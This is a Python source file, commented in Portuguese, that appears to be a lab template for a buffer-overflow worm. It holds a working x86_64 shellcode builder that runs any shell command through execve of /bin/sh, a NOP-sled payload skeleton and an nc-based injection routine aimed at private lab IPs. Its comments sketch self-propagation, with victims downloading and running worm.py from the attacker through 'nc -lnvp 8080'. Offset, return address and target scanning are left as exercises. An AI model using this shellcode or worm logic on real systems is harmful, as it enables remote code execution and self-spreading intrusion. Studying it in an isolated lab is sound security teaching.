#!/usr/bin/env python3
import os
import subprocess
from random import randint
import socket

def create_hex_command(command = b"echo 'true' > infectado.txt"):
    comando_alinhado = command + b"\x00"
    while len(comando_alinhado) % 8 != 0:
        comando_alinhado += b"\x00"
    # Constrói o shellcode dinamicamente invertendo o comando para o PUSH (Stack cresce para baixo)
    shellcode_dinamico = b""

    # 1. Empilha o comando em blocos de 8 bytes (x86_64)
    for i in range(len(comando_alinhado) - 8, -1, -8):
        bloco = comando_alinhado[i:i+8]
        shellcode_dinamico += b"\x48\xb8" + bloco  # mov rax, bloco_de_8_bytes
        shellcode_dinamico += b"\x50"              # push rax

    shellcode_dinamico += b"\x48\x89\xe2"          # mov rdx, rsp (rdx aponta para o comando)

    # 2. Empilha a flag "-c"
    shellcode_dinamico += (
        b"\x48\xb8\x2d\x63\x00\x00\x00\x00\x00\x00"  # mov rax, 0x632d ("-c\x00...")
        b"\x50"                                      # push rax
        b"\x48\x89\xe6"                              # mov rsi, rsp (rsi aponta para "-c")
    )

    # 3. Empilha o executável "/bin/sh"
    shellcode_dinamico += (
        b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # mov rax, 0x0068732f6e69622f ("/bin/sh\x00")
        b"\x50"                                      # push rax
        b"\x48\x89\xe7"                              # mov rdi, rsp (rdi aponta para "/bin/sh")
    )

    # 4. Constrói o array argv na pilha [ /bin/sh, -c, comando, NULL ]
    shellcode_dinamico += (
        b"\x48\x31\xc0"  # xor rax, rax
        b"\x50"          # push rax (NULL terminator do array)
        b"\x52"          # push rdx (ponteiro para o comando)
        b"\x56"          # push rsi (ponteiro para "-c")
        b"\x57"          # push rdi (ponteiro para "/bin/sh")
        b"\x48\x89\xe6"  # mov rsi, rsp (rsi agora é o argv[])
        b"\x48\x31\xd2"  # xor rdx, rdx (envp = NULL)
        b"\xb0\x3b"      # mov al, 59 (syscall execve)
        b"\x0f\x05"      # syscall
    )
    print(f"Shellcode pronto ({len(shellcode_dinamico)} bytes):")
    print(shellcode_dinamico)
    return shellcode_dinamico

def getNextTarget():
    """Gera uma lista com todos os possíveis IPs dentro das sub-redes (172.28.1.10 a 172.28.5.14)."""
    # TODO: implementar a função que pega o próximo ip
    return "172.28.1.10"

def getBadfile(n_line, malicious_code):
    """
        Task 1: O Ataque de Buffer Overflow
        Construa a sua carga maliciosa (payload) aqui.
    """
    # Preenche o buffer com instruções NOP (0x90) -> pula pra próxima operação
    content = bytearray(0x90 for i in range(500))

    # shellcode = create_hex_command(command)
    # ===================================================================
    # TODO: Defina onde o shellcode vai ficar no payload
    # start = ...
    # content[start:] = shellcode

    # TODO: Calcule o Offset e o Endereço de Retorno correto da vítima
    # ret    =   # Substitua pelo endereço de retorno real (aponta para o seu NOP sled/shellcode)
    # offset =   # Substitua pelo deslocamento (offset) correto, que pode ser descoberto por GDB

    # L = ...
    # content[offset:offset + L] = (ret).to_bytes(L, byteorder="little")
    # ===================================================================

    return content

def inject(badfile, targetIP):
    with open("badfile", "wb") as f:
        f.write(badfile)

    print(f"Lançando ataque contra {targetIP} na porta 9090...")

    subprocess.run(
        f"cat badfile | nc -w3 {targetIP} 9090",
        shell=True,
        timeout=5
    )

def main():
    print("O worm chegou neste host! ^_^")
    
    targetIP = getNextTarget()
    print(f"Alvo selecionado: {targetIP}")

    # 1. Abre uma porta em background no NOSSO host para entregar o worm.py
    # O comando 'nc -lnvp 8080 < worm.py' fica esperando a vítima conectar
    # é necessário abrir um subprocesso com o comando

    # 2. Cria o comando que a VÍTIMA vai executar ao receber o Buffer Overflow
    # Ela vai conectar no nosso IP, baixar o arquivo, dar permissão e rodar
    
    # 4. Fecha o servidor temporário após o envio
    
    print("Ataque concluído com sucesso! :D")
    exit()

if __name__ == "__main__":
    while True:
        main()